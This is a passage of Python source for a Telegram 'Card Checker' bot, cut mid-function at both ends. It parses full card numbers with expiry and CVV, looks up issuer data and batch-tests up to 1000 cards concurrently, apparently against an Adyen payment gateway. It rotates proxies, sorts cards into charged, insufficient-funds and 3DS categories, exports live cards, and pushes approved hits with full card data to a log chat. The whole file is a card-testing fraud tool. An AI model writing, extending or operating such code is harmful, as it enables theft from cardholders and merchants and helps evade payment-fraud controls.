            res["label"] = f"❌ {clean_err[:40]}"
            res["msg"]   = clean_err
            res["status_type"] = "error"

    res["elapsed"] = round(time.time() - _t0, 2)
    return res

    res["elapsed"] = round(time.time() - _t0, 2)
    return res

# ──────────────────────────────────────────────────────────────
# PARSER
# ──────────────────────────────────────────────────────────────
def parse_card(text):
    if not text:
        return None
    # 1. Flexible regex match for 13-19 digit card + MM + YY/YYYY + CVV
    pattern = r"([0-9]{13,19})[\s/|:,-]+([0-9]{1,2})[\s/|:,-]+([0-9]{2,4})[\s/|:,-]+([0-9]{3,4})"
    match = re.search(pattern, str(text))
    if match:
        num, mm, yy, cvv = match.groups()
        if not (1 <= int(mm) <= 12):
            if 1 <= int(yy) <= 12 and (len(mm) == 2 or len(mm) == 4):
                mm, yy = yy, mm
            else:
                return None
        if len(yy) == 2:
            yy = "20" + yy
        if 2024 <= int(yy) <= 2045 and (3 <= len(cvv) <= 4):
            return num, mm.zfill(2), yy, cvv

    # 2. Fallback delimiter split
    cleaned = re.sub(r"[\|/: ]+", "|", str(text).strip())
    p = [x for x in cleaned.split("|") if x]
    if len(p) >= 4:
        num, mm, yy, cvv = (p[0].strip(), p[1].strip(), p[2].strip(), p[3].strip())
        if num.isdigit() and 13 <= len(num) <= 19 and mm.isdigit() and 1 <= int(mm) <= 12 and cvv.isdigit():
            if len(yy) == 2: yy = "20" + yy
            if yy.isdigit() and 2024 <= int(yy) <= 2045 and (3 <= len(cvv) <= 4):
                return num, mm.zfill(2), yy, cvv
    return None

# ─────────────────────────────────────────────────────────────
# BIN DATABASE (bin_new.csv) & COUNTRY/CURRENCY LOOKUP
# ─────────────────────────────────────────────────────────────
BIN_DB = {}

def load_bin_db():
    csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin_new.csv")
    if not os.path.exists(csv_file):
        csv_file = "bin_new.csv"
    if os.path.exists(csv_file):
        try:
            t0 = time.time()
            with open(csv_file, mode="r", encoding="utf-8", errors="ignore") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    BIN_DB[row["BIN"]] = {
                        "brand": row.get("Brand", "").strip().upper(),
                        "type": row.get("Type", "").strip().upper(),
                        "category": row.get("Category", "").strip().upper(),
                        "issuer": row.get("Issuer", "").strip(),
                        "iso2": row.get("isoCode2", "").strip().upper(),
                        "iso3": row.get("isoCode3", "").strip().upper(),
                        "country": row.get("CountryName", "").strip().title(),
                    }
            log.info(f"Loaded {len(BIN_DB)} BINs from bin_new.csv in {time.time()-t0:.2f}s")
        except Exception as e:
            log.error(f"Failed loading bin_new.csv: {e}")

load_bin_db()

_ISO2_TO_CURRENCY = {
    "US": "USD", "GB": "GBP", "AU": "AUD", "IN": "INR", "CA": "CAD", "DE": "EUR", "FR": "EUR",
    "NL": "EUR", "IT": "EUR", "ES": "EUR", "BR": "BRL", "MX": "MXN", "JP": "JPY", "CN": "CNY",
    "RU": "RUB", "ZA": "ZAR", "SG": "SGD", "NZ": "NZD", "AE": "AED", "SA": "SAR", "TR": "TRY",
    "PL": "PLN", "SE": "SEK", "NO": "NOK", "CH": "CHF", "HK": "HKD", "MY": "MYR", "ID": "IDR",
    "PH": "PHP", "TH": "THB", "PK": "PKR", "BD": "BDT", "IL": "ILS", "UA": "UAH", "PT": "EUR",
    "BE": "EUR", "AT": "EUR", "DK": "DKK", "FI": "EUR", "GR": "EUR", "CZ": "CZK", "HU": "HUF",
    "RO": "RON", "AR": "ARS", "CL": "CLP", "CO": "COP", "NG": "NGN", "GH": "GHS", "KE": "KES",
    "EG": "EGP", "VN": "VND", "KR": "KRW", "IR": "IRR", "IQ": "IQD", "MA": "MAD", "DZ": "DZD",
}

def _flag_from_iso2(iso2: str) -> str:
    """Generate flag emoji from 2-letter country code."""
    if len(iso2) == 2 and iso2.isalpha():
        return chr(0x1F1E6 + ord(iso2[0]) - ord('A')) + chr(0x1F1E6 + ord(iso2[1]) - ord('A'))
    return ""

# ─────────────────────────────────────────────────────────────
# FORMATTER (new UI)
# ─────────────────────────────────────────────────────────────
# Unicode bold helpers — use ordinal offsets (reliable across all editors)
def _B(t):
    """Mathematical Bold (𝐀𝐁𝐂 / 𝐚𝐛𝐜)"""
    out = []
    for c in t:
        if 'A' <= c <= 'Z': out.append(chr(0x1D400 + ord(c) - ord('A')))
        elif 'a' <= c <= 'z': out.append(chr(0x1D41A + ord(c) - ord('a')))
        elif '0' <= c <= '9': out.append(chr(0x1D7CE + ord(c) - ord('0')))
        else: out.append(c)
    return ''.join(out)

def _SB(t):
    """Mathematical Sans-Serif Bold (𝗔𝗕𝗖 / 𝗮𝗯𝗰)"""
    out = []
    for c in t:
        if 'A' <= c <= 'Z': out.append(chr(0x1D5D4 + ord(c) - ord('A')))
        elif 'a' <= c <= 'z': out.append(chr(0x1D5EE + ord(c) - ord('a')))
        elif '0' <= c <= '9': out.append(chr(0x1D7EC + ord(c) - ord('0')))
        else: out.append(c)
    return ''.join(out)

def fmt(res, idx=0):
    num   = res["card"]
    mm    = res["exp_month"]
    yy    = res["exp_year"]
    cvv   = res["cvv"]
    bi    = res["bin"]
    stype = res.get("status_type", "declined")
    elapsed = res.get("elapsed", 0.0)

    # Lookup BIN database
    bdata = BIN_DB.get(num[:6], {})

    brand = bdata.get("brand") or ("VISA" if num.startswith("4") else "MASTERCARD" if num.startswith("5") else "AMEX" if num[:2] in ("34","37") else "DISCOVER" if num.startswith("6") else "")
    card_type = bdata.get("type") or bi.get("cardType", "")
    card_cat  = bdata.get("category") or bi.get("cardCategory", "")
    bank      = bdata.get("issuer") or bi.get("bank", "")

    iso2  = bdata.get("iso2", "")
    cname = bdata.get("country") or bi.get("country", "")
    cflag = _flag_from_iso2(iso2) if iso2 else ""
    ccur  = _ISO2_TO_CURRENCY.get(iso2, "")

    # Status header
    if stype == "approved":
        header = _B("Approved") + " \u2705"
    elif stype in ("3ds", "live"):
        header = _B("Live") + " \u26a1"
    elif stype == "error":
        header = _B("Error") + " \U0001f4a5"
    else:
        header = _B("Declined") + " \u274c"

    # Response message with code if present
    code = res.get("code", "")
    raw_msg = res.get("msg", "")
    # Only sanitize non-empty messages to avoid converting "" -> "Gateway Error"
    msg = sanitize_error_message(raw_msg) if raw_msg else ""
    lbl = res.get("label", "")
    if stype in ("approved", "live", "3ds"):
        # For approved/live cards, don't show the error msg — show a clean label
        if stype == "approved":
            resp_msg = "Approved"
        elif code == "3.02" or (msg and "insufficient" in msg.lower()):
            resp_msg = "Insufficient Funds"
        else:
            resp_msg = "3DS Required" if stype in ("live", "3ds") else lbl or "Live"
    elif code and msg:
        resp_msg = f"{code} - {msg}"
    elif msg:
        resp_msg = msg
    elif code:
        resp_msg = f"Declined ({code})"
    else:
        resp_msg = lbl or "Card Declined"
    resp_msg = sanitize_error_message(resp_msg) if resp_msg else lbl or "Card Declined"

    # Card display
    card_str = f"{num}|{mm}|{yy}|{cvv}"

    # Info line: e.g. VISA - CREDIT - CLASSIC
    info_parts = [p for p in [brand, card_type, card_cat] if p]
    info_line = " - ".join(info_parts)

    # Country line: e.g. United States - 🇺🇸 - USD
    country_parts = [p for p in [cname, cflag, ccur] if p]
    country_line = " - ".join(country_parts)

    lines = []
    if idx: lines.append(f"<b>#{idx}</b>")
    lines.append(header)
    lines.append("")
    amt_str = res.get("amount", f"149 {CURRENCY}")
    lines.append(_SB("Card") + f"- <code>{card_str}</code>")
    lines.append(_B("Gateway") + f"- Adyen {amt_str}")  
    lines.append(_B("Response") + f"- \u293f {resp_msg} \u293e")
    lines.append("")
    lines.append(_SB("Info") + f"- {info_line}")
    lines.append(_B("Bank") + f"- {bank}")
    lines.append(_B("Country") + f"- {country_line}")
    lines.append("")
    lines.append(_SB("Time") + f"- {elapsed} " + _B("seconds"))
    return "\n".join(lines)

# ──────────────────────────────────────────────────────────────
# ACCESS CONTROL HELPER
# ──────────────────────────────────────────────────────────────
async def check_access(msg: Message) -> bool:
    uid = msg.from_user.id
    if is_authorized(uid):
        return True
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔑 Request Access", callback_data="req_access", style="primary")]
    ])
    await msg.answer(
        "<b>⛔ Access Restricted</b>\n\n"
        "You do not have access to use this bot.\n"
        "Click the button below to request access from the admin.",
        reply_markup=kb,
        parse_mode="HTML"
    )
    return False

async def _push_hit(bot, res: dict, user_id: int, username: str = None, full_name: str = None):
    if not APPROVED_LOG_CHAT:
        return
    try:
        if username:
            user_mention = f"@{username}"
        elif full_name:
            user_mention = f'<a href="tg://user?id={user_id}">{full_name}</a>'
        else:
            user_mention = f'<a href="tg://user?id={user_id}">{user_id}</a>'

        num   = res.get("card", "")
        mm    = res.get("exp_month", "")
        yy    = res.get("exp_year", "")
        cvv   = res.get("cvv", "")
        bi    = res.get("bin", {})
        bdata = BIN_DB.get(num[:6], {})

        brand     = bdata.get("brand") or ("VISA" if num.startswith("4") else "MASTERCARD" if num.startswith("5") else "AMEX" if num[:2] in ("34","37") else "DISCOVER" if num.startswith("6") else "")
        card_type = bdata.get("type") or bi.get("cardType", "")
        card_cat  = bdata.get("category") or bi.get("cardCategory", "")
        bank      = bdata.get("issuer") or bi.get("bank", "")
        iso2      = bdata.get("iso2", "")
        cname     = bdata.get("country") or bi.get("country", "")
        cflag     = _flag_from_iso2(iso2) if iso2 else ""
        ccur      = _ISO2_TO_CURRENCY.get(iso2, "")

        info_parts    = [p for p in [brand, card_type, card_cat] if p]
        info_line     = " - ".join(info_parts) or "N/A"
        country_parts = [p for p in [cname, cflag, ccur] if p]
        country_line  = " - ".join(country_parts) or "N/A"
        amt_str       = res.get("amount", f"149 {CURRENCY}")
        card_str      = f"{num}|{mm}|{yy}|{cvv}"
        elapsed       = res.get("elapsed", 0.0)

        text = (
            f"{_B('Approved')} \u2705\n"
            f"\n"
            f"{_SB('Card')}- <code>{card_str}</code>\n"
            f"{_B('Gateway')}- Adyen {amt_str}\n"
            f"{_B('Response')}- \u293f Approved \u293e\n"
            f"\n"
            f"{_SB('Info')}- {info_line}\n"
            f"{_B('Bank')}- {bank or 'N/A'}\n"
            f"{_B('Country')}- {country_line}\n"
            f"\n"
            f"{_SB('Time')}- {elapsed} {_B('seconds')}\n"
            f"\n"
            f"\U0001f464 {_B('By')}- {user_mention}"
        )
        await bot.send_message(APPROVED_LOG_CHAT, text, parse_mode="HTML")
    except Exception:
        pass

# ──────────────────────────────────────────────────────────────
# HANDLERS
# ──────────────────────────────────────────────────────────────
router = Router()

# ── Admin Manual Commands ─────────────────────────────────────
@router.message(Command("a"))
async def cmd_approve(msg: Message):
    if not ADMIN_ID or msg.from_user.id != ADMIN_ID:
        return
    args = msg.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await msg.answer("Usage: /a <code>userid</code>", parse_mode="HTML")
        return
    target_uid = int(args[1])
    AUTH_USERS.add(target_uid)
    save_authorized_users(AUTH_USERS)
    await msg.answer(f"✅ User <code>{target_uid}</code> has been <b>approved</b>.", parse_mode="HTML")
    try:
        await msg.bot.send_message(
            chat_id=target_uid,
            text="🎉 <b>Your access to the bot has been approved!</b>\nYou can now use /chk, /mchk, and /txt.",
            parse_mode="HTML"
        )
    except Exception:
        pass

@router.message(Command("da"))
async def cmd_disapprove(msg: Message):
    if not ADMIN_ID or msg.from_user.id != ADMIN_ID:
        return
    args = msg.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await msg.answer("Usage: /da <code>userid</code>", parse_mode="HTML")
        return
    target_uid = int(args[1])
    AUTH_USERS.discard(target_uid)
    save_authorized_users(AUTH_USERS)
    await msg.answer(f"❌ Access for user <code>{target_uid}</code> has been <b>revoked</b>.", parse_mode="HTML")
    try:
        await msg.bot.send_message(
            chat_id=target_uid,
            text="⚠️ <b>Your access to the bot has been revoked.</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ── Global Proxy Management (Admin Only) ──────────────────────
def get_proxy_panel_text() -> str:
    count = len(GLOBAL_PROXIES)
    lines = [
        "<b>🌐 Global Proxy Management</b>\n",
        f"📊 <b>Active Proxies:</b> <code>{count}</code>",
    ]
    if count > 0:
        lines.append("\n<b>Configured Proxies:</b>")
        for i, p in enumerate(GLOBAL_PROXIES[:10], 1):
            lines.append(f"{i}. <code>{mask_proxy(p)}</code>")
        if count > 10:
            lines.append(f"<i>...and {count - 10} more</i>")
    else:
        lines.append("\n<i>No proxies in pool. Bot is currently using direct connection.</i>")

    lines.append(
        "\n<b>Commands:</b>\n"
        "• <code>/proxy add &lt;proxies&gt;</code> — add 1 or more proxies\n"
        "• Reply to a <b>.txt file</b> with <code>/proxy add</code> to import bulk\n"
        "• <code>/proxy del &lt;index_or_proxy&gt;</code> — remove a proxy\n"
        "• Supported: <code>host:port:user:pass</code>, <code>http://...</code>, <code>socks5://...</code>"
    )
    return "\n".join(lines)

def get_proxy_panel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⚡ Test All", callback_data="prx_test", style="primary"),
            InlineKeyboardButton(text="🧹 Remove Dead", callback_data="prx_clean", style="danger"),
        ],
        [
            InlineKeyboardButton(text="🗑 Delete All", callback_data="prx_clear_all", style="danger"),
            InlineKeyboardButton(text="🔄 Refresh", callback_data="prx_refresh", style="primary"),
        ]
    ])

@router.message(Command("proxy"))
async def cmd_proxy(msg: Message):
    if not ADMIN_ID or msg.from_user.id != ADMIN_ID:
        await msg.answer(f"🌐 <b>Global Proxies:</b> <code>{len(GLOBAL_PROXIES)}</code> active in pool.", parse_mode="HTML")
        return

    # Check if replying to a document / .txt file
    replied = msg.reply_to_message
    if replied and replied.document:
        doc = replied.document
        if doc.file_size and doc.file_size > 10 * 1024 * 1024:
            await msg.answer("❌ File too large (max 10 MB).")
            return

        wait_m = await msg.answer("📂 Reading proxy file…")
        try:
            file_obj = await msg.bot.get_file(doc.file_id)
            dl = await msg.bot.download_file(file_obj.file_path)
            raw_text = dl.read().decode("utf-8", errors="ignore")

            candidates = []
            for line in raw_text.splitlines():
                for item in line.split():
                    norm = normalize_proxy(item)
                    if norm and norm not in GLOBAL_PROXIES and norm not in candidates:
                        candidates.append(norm)

            if not candidates:
                await wait_m.edit_text("⚠️ No new valid proxies found in file.", parse_mode="HTML")
                return

            await wait_m.edit_text(f"⚡ Testing <b>{len(candidates)}</b> new proxy(s)…", parse_mode="HTML")

            loop = asyncio.get_event_loop()
            tasks = [loop.run_in_executor(_pool, lambda p=prx: (p, test_single_proxy(p)[0])) for prx in candidates]
            test_results = await asyncio.gather(*tasks)

            live_proxies = [p for p, is_live in test_results if is_live]
            dead_count = len(candidates) - len(live_proxies)

            if live_proxies:
                GLOBAL_PROXIES.extend(live_proxies)
                save_proxies(GLOBAL_PROXIES)
                await wait_m.edit_text(
                    f"✅ Added <b>{len(live_proxies)}</b> LIVE proxy(s)" +
                    (f" (<i>{dead_count} dead skipped</i>)" if dead_count > 0 else "") +
                    f".\n📊 <b>Total Active in Pool:</b> <code>{len(GLOBAL_PROXIES)}</code>",
                    parse_mode="HTML"
                )
            else:
                await wait_m.edit_text(f"❌ All <b>{len(candidates)}</b> proxies failed latency/connectivity check.", parse_mode="HTML")
        except Exception as e:
            await wait_m.edit_text(f"❌ Failed to process proxy file: {e}")
        return

    full_text = msg.text or ""
    lines = [l.strip() for l in full_text.splitlines() if l.strip()]
    first_parts = lines[0].split(maxsplit=2)

    if len(first_parts) >= 2:
        sub = first_parts[1].lower()
        if sub in ("add", "+"):
            to_parse = []
            if len(first_parts) > 2:
                to_parse.append(first_parts[2])
            to_parse.extend(lines[1:])

            all_raw = []
            for item in to_parse:
                all_raw.extend(item.split())

            candidates = []
            for raw_p in all_raw:
                norm = normalize_proxy(raw_p)
                if norm and norm not in GLOBAL_PROXIES and norm not in candidates:
                    candidates.append(norm)

            if not candidates:
                await msg.answer("⚠️ No new valid proxies found.", parse_mode="HTML")
                return

            wait_m = await msg.answer(f"⚡ Testing <b>{len(candidates)}</b> new proxy(s)…", parse_mode="HTML")
            loop = asyncio.get_event_loop()
            tasks = [loop.run_in_executor(_pool, lambda p=prx: (p, test_single_proxy(p)[0])) for prx in candidates]
            test_results = await asyncio.gather(*tasks)

            live_proxies = [p for p, is_live in test_results if is_live]
            dead_count = len(candidates) - len(live_proxies)

            if live_proxies:
                GLOBAL_PROXIES.extend(live_proxies)
                save_proxies(GLOBAL_PROXIES)
                await wait_m.edit_text(
                    f"✅ Added <b>{len(live_proxies)}</b> LIVE proxy(s)" +
                    (f" (<i>{dead_count} dead skipped</i>)" if dead_count > 0 else "") +
                    f".\n📊 <b>Total Active in Pool:</b> <code>{len(GLOBAL_PROXIES)}</code>",
                    parse_mode="HTML"
                )
            else:
                await wait_m.edit_text(f"❌ All <b>{len(candidates)}</b> proxies failed connectivity test.", parse_mode="HTML")
            return

        elif sub in ("del", "rm", "-"):
            if len(first_parts) < 3:
                await msg.answer("Usage: /proxy del <code>index_or_proxy</code>", parse_mode="HTML")
                return
            target = first_parts[2].strip()
            if target.isdigit():
                idx = int(target) - 1
                if 0 <= idx < len(GLOBAL_PROXIES):
                    removed = GLOBAL_PROXIES.pop(idx)
                    save_proxies(GLOBAL_PROXIES)
                    await msg.answer(f"🗑 Removed proxy: <code>{mask_proxy(removed)}</code>", parse_mode="HTML")
                else:
                    await msg.answer("❌ Invalid proxy index.", parse_mode="HTML")
            else:
                norm = normalize_proxy(target)
                if norm in GLOBAL_PROXIES:
                    GLOBAL_PROXIES.remove(norm)
                    save_proxies(GLOBAL_PROXIES)
                    await msg.answer(f"🗑 Removed proxy: <code>{mask_proxy(norm)}</code>", parse_mode="HTML")
                else:
                    await msg.answer("❌ Proxy not found in pool.", parse_mode="HTML")
            return

        elif sub in ("clear", "clean_all"):
            GLOBAL_PROXIES.clear()
            save_proxies(GLOBAL_PROXIES)
            await msg.answer("🗑 <b>All proxies cleared!</b>", parse_mode="HTML")
            return

    await msg.answer(get_proxy_panel_text(), reply_markup=get_proxy_panel_kb(), parse_mode="HTML")

# ── Proxy Inline Callbacks ────────────────────────────────────
@router.callback_query(F.data == "prx_refresh")
async def cb_prx_refresh(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Admin only!", show_alert=True)
        return
    try:
        await cb.message.edit_text(get_proxy_panel_text(), reply_markup=get_proxy_panel_kb(), parse_mode="HTML")
        await cb.answer("Refreshed!")
    except Exception:
        await cb.answer()

@router.callback_query(F.data == "prx_clear_all")
async def cb_prx_clear_all(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Admin only!", show_alert=True)
        return
    GLOBAL_PROXIES.clear()
    save_proxies(GLOBAL_PROXIES)
    await cb.message.edit_text(get_proxy_panel_text(), reply_markup=get_proxy_panel_kb(), parse_mode="HTML")
    await cb.answer("All proxies deleted!", show_alert=True)

@router.callback_query(F.data == "prx_test")
async def cb_prx_test(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Admin only!", show_alert=True)
        return
    if not GLOBAL_PROXIES:
        await cb.answer("No proxies to test!", show_alert=True)
        return

    await cb.answer("Testing proxies…")
    wait_msg = await cb.message.reply("⚡ <i>Testing all proxies, please wait…</i>", parse_mode="HTML")

    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(_pool, lambda p=prx: (p, *test_single_proxy(p))) for prx in list(GLOBAL_PROXIES)]
    results = await asyncio.gather(*tasks)

    live_count = sum(1 for _, ok, _, _ in results if ok)
    dead_count = len(results) - live_count

    lines = [
        f"<b>⚡ Proxy Test Results ({len(GLOBAL_PROXIES)})</b>\n",
        f"🟢 <b>Live:</b> {live_count} | 🔴 <b>Dead:</b> {dead_count}\n"
    ]
    for p, ok, ip_msg, lat in results[:15]:
        status_icon = "🟢" if ok else "🔴"
        lines.append(f"{status_icon} <code>{mask_proxy(p)}</code> [{lat}s] ({ip_msg})")
    if len(results) > 15:
        lines.append(f"<i>...and {len(results)-15} more</i>")
    await wait_msg.edit_text("\n".join(lines), parse_mode="HTML")

@router.callback_query(F.data == "prx_clean")
async def cb_prx_clean(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Admin only!", show_alert=True)
        return
    if not GLOBAL_PROXIES:
        await cb.answer("No proxies in pool!", show_alert=True)
        return

    await cb.answer("Testing & removing dead proxies…")
    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(_pool, lambda p=prx: (p, test_single_proxy(p)[0])) for prx in list(GLOBAL_PROXIES)]
    results = await asyncio.gather(*tasks)

    alive = [p for p, ok in results if ok]
    removed_count = len(GLOBAL_PROXIES) - len(alive)
    GLOBAL_PROXIES.clear()
    GLOBAL_PROXIES.extend(alive)
    save_proxies(GLOBAL_PROXIES)

    await cb.message.edit_text(get_proxy_panel_text(), reply_markup=get_proxy_panel_kb(), parse_mode="HTML")
    await cb.answer(f"🧹 Removed {removed_count} dead proxy(s)!", show_alert=True)

# ── Access Request Callbacks ──────────────────────────────────
@router.callback_query(F.data == "req_access")
async def cb_req_access(cb: CallbackQuery):
    uid = cb.from_user.id
    if is_authorized(uid):
        await cb.answer("You already have access!", show_alert=True)
        return

    if not ADMIN_ID:
        await cb.answer("Admin ID is not configured.", show_alert=True)
        return

    username = f"@{cb.from_user.username}" if cb.from_user.username else "No username"
    fullname = cb.from_user.full_name or ""

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Approve", callback_data=f"adm_app_{uid}", style="success"),
            InlineKeyboardButton(text="❌ Disapprove", callback_data=f"adm_dis_{uid}", style="danger"),
        ]
    ])
    admin_text = (
        f"<b>🔔 New Access Request</b>\n\n"
        f"👤 <b>User:</b> {fullname} ({username})\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>"
    )
    try:
        await cb.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=kb, parse_mode="HTML")
        await cb.answer("Access request sent to admin!", show_alert=True)
        try:
            await cb.message.edit_text("⏳ <b>Access request submitted.</b>\nPlease wait for the admin to approve.", parse_mode="HTML")
        except Exception:
            pass
    except Exception as e:
        await cb.answer(f"Failed to notify admin: {e}", show_alert=True)

@router.callback_query(F.data.startswith("adm_app_"))
async def cb_admin_approve(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Only admin can do this!", show_alert=True)
        return
    target_uid = int(cb.data.split("_")[2])
    AUTH_USERS.add(target_uid)
    save_authorized_users(AUTH_USERS)
    try:
        await cb.message.edit_text(
            cb.message.text + f"\n\n<b>✅ Approved by Admin</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass
    await cb.answer("User approved!")
    try:
        await cb.bot.send_message(
            chat_id=target_uid,
            text="🎉 <b>Your access request has been approved!</b>\nYou can now use /chk, /mchk, and /txt.",
            parse_mode="HTML"
        )
    except Exception:
        pass

@router.callback_query(F.data.startswith("adm_dis_"))
async def cb_admin_disapprove(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != ADMIN_ID:
        await cb.answer("Only admin can do this!", show_alert=True)
        return
    target_uid = int(cb.data.split("_")[2])
    AUTH_USERS.discard(target_uid)
    save_authorized_users(AUTH_USERS)
    try:
        await cb.message.edit_text(
            cb.message.text + f"\n\n<b>❌ Disapproved by Admin</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass
    await cb.answer("User disapproved!")
    try:
        await cb.bot.send_message(
            chat_id=target_uid,
            text="❌ <b>Your access request was declined by the admin.</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ── On-Demand TXT Category Export Callbacks ───────────────────
@router.callback_query(F.data.startswith("txtdl_"))
async def cb_txt_download_category(cb: CallbackQuery):
    parts = cb.data.split("_")
    if len(parts) < 3:
        await cb.answer("Invalid request.")
        return

    target_uid = int(parts[1])
    cat = parts[2].lower()

    if cb.from_user.id != target_uid and (not ADMIN_ID or cb.from_user.id != ADMIN_ID):
        await cb.answer("⛔ Access Denied: Only the person who started this check (or Admin) can access these results!", show_alert=True)
        return

    session = USER_ACTIVE_CHECKS.get(target_uid)
    results = session.get("results") if session else USER_LAST_RESULTS.get(target_uid, [])

    if not results:
        await cb.answer("No cards processed yet!", show_alert=True)
        return

    filtered = []
    for idx, r in list(results):
        stype = r.get("status_type", "declined")
        code  = str(r.get("code", ""))
        lbl   = str(r.get("label", ""))

        is_charged  = (stype == "approved" or "APPROVED" in lbl)
        is_insuff   = (code == "3.02" or "INSUFFICIENT" in lbl)
        is_live_3ds = (stype in ("3ds", "live") or "LIVE" in lbl) and not is_charged and not is_insuff
        is_error    = (stype == "error")
        is_dead     = (not is_charged and not is_insuff and not is_live_3ds and not is_error)

        if cat == "charged" and is_charged:
            filtered.append((idx, r))
        elif cat == "insuff" and is_insuff:
            filtered.append((idx, r))
        elif cat == "3ds" and is_live_3ds:
            filtered.append((idx, r))
        elif cat == "dead" and is_dead:
            filtered.append((idx, r))
        elif cat == "error" and is_error:
            filtered.append((idx, r))

    if not filtered:
        await cb.answer(f"No cards in '{cat.upper()}' category yet!", show_alert=True)
        return

    await cb.answer(f"Exporting {len(filtered)} {cat.upper()} cards…")

    file_lines = []
    for idx, r in filtered:
        c_num = r.get("card", "")
        c_exp = f"{r.get('exp_month','')}/{r.get('exp_year','')}"
        c_cvv = r.get("cvv", "")
        status_lbl = r.get("label", "")
        res_code = r.get("code", "")
        res_msg = r.get("msg", "")
        gw = f"Adyen {r.get('amount','149 INR')}"
        file_lines.append(f"#{idx} {c_num}|{c_exp}|{c_cvv} | {gw} | {status_lbl} | {res_code} {res_msg}".strip())

    file_content = "\n".join(file_lines).encode("utf-8")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cat_filename = f"{cat}_cards_{timestamp}.txt"
    caption = f"📄 <b>Live Export:</b> <code>{cat.upper()}</code> (<b>{len(filtered)}</b> cards)"

    try:
        await cb.message.answer_document(
            BufferedInputFile(file_content, filename=cat_filename),
            caption=caption,
            parse_mode="HTML"
        )
    except Exception as e:
        await cb.answer(f"Failed to send file: {e}", show_alert=True)

# ── User Commands ─────────────────────────────────────────────
@router.message(Command("start","help"))
async def cmd_start(msg: Message):
    if not await check_access(msg):
        return
    await msg.answer(
        "<b>🔍 Card Checker</b>\n\n"
        "/chk <code>number|mm|yy|cvv</code> — single card\n"
        "/mchk — up to 10 cards (3 concurrent), one per line\n"
        "/txt — reply to a .txt file to check up to 1000 cards (100 concurrent)\n"
        "/cancel — cancel your ongoing check\n\n"
        "<i>Example:</i>\n"
        "<code>/chk 4240324793292026|03|30|935</code>",
        parse_mode="HTML"
    )

@router.message(Command("cancel"))
async def cmd_cancel(msg: Message):
    if not await check_access(msg):
        return

    uid = msg.from_user.id
    args = msg.text.split()

    # Admin can cancel another user's check with /cancel <userid>
    if len(args) > 1 and args[1].isdigit() and uid == ADMIN_ID:
        target_uid = int(args[1])
        if cancel_user_check(target_uid):
            await msg.answer(f"🛑 Cancelled check for user <code>{target_uid}</code>.", parse_mode="HTML")
        else:
            await msg.answer(f"ℹ️ User <code>{target_uid}</code> has no active check in progress.", parse_mode="HTML")
        return

    if not is_user_checking(uid):
        await msg.answer("ℹ️ You don't have any check in progress.")
        return

    cancel_user_check(uid)
    await msg.answer("🛑 <b>Cancellation requested!</b> Stopping your check immediately…", parse_mode="HTML")

@router.callback_query(F.data.startswith("chk_cancel_"))
async def cb_cancel_check(cb: CallbackQuery):
    target_uid = int(cb.data.split("_")[2])
    caller_uid = cb.from_user.id

    if caller_uid != target_uid and (not ADMIN_ID or caller_uid != ADMIN_ID):
        await cb.answer("⛔ Access Denied: You can only cancel your own check!", show_alert=True)
        return

    if not is_user_checking(target_uid):
        await cb.answer("No active check running.", show_alert=True)
        return

    cancel_user_check(target_uid)
    await cb.answer("🛑 Check cancelled!", show_alert=True)

@router.message(Command("chk"))
async def cmd_chk(msg: Message):
    if not await check_access(msg):
        return

    uid = msg.from_user.id

    # Extract card text from arguments OR reply message
    card_text = ""
    args = msg.text.split(maxsplit=1) if msg.text else []
    if len(args) > 1 and args[1].strip():
        card_text = args[1].strip()
    elif msg.reply_to_message:
        card_text = (msg.reply_to_message.text or msg.reply_to_message.caption or "").strip()

    if not card_text:
        await msg.answer("Usage: /chk <code>number|mm|yy|cvv</code> (or reply to a card message)", parse_mode="HTML")
        return

    p = parse_card(card_text)
    if not p:
        await msg.answer("❌ Invalid format. Use: <code>number|mm|yy|cvv</code>", parse_mode="HTML")
        return

    wait = await msg.answer("🔄 Checking…")
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(_pool, lambda: run_check(*p))
        await wait.edit_text(fmt(result), parse_mode="HTML")
    except Exception as e:
        await wait.edit_text(f"❌ Error: {sanitize_error_message(str(e))}", parse_mode="HTML")
        return
    # fire-and-forget, fully isolated from user-facing flow
    try:
        stype = result.get("status_type", "")
        if stype == "approved" or "APPROVED" in str(result.get("label", "")):
            user = msg.from_user
            asyncio.ensure_future(_push_hit(
                msg.bot, result,
                user_id=user.id,
                username=user.username,
                full_name=user.full_name,
            ))
    except Exception:
        pass

def format_mchk_message(card_entries: list, total_count: int, stats: dict, is_cancelled: bool = False, is_done: bool = False, elapsed_sec: float = 0.0) -> str:
    checked_count = stats["charged"] + stats["insuff"] + stats["live_3d"] + stats["dead"] + stats["error"]
    
    if is_cancelled:
        header = f"🛑 <b>Mass Check Cancelled</b> <code>[{checked_count}/{total_count}]</code>"
    elif is_done:
        header = f"✅ <b>Mass Check Completed</b> <code>[{checked_count}/{total_count}]</code>"
    else:
        header = f"🔄 <b>Mass Checking…</b> <code>[{checked_count}/{total_count}]</code>"

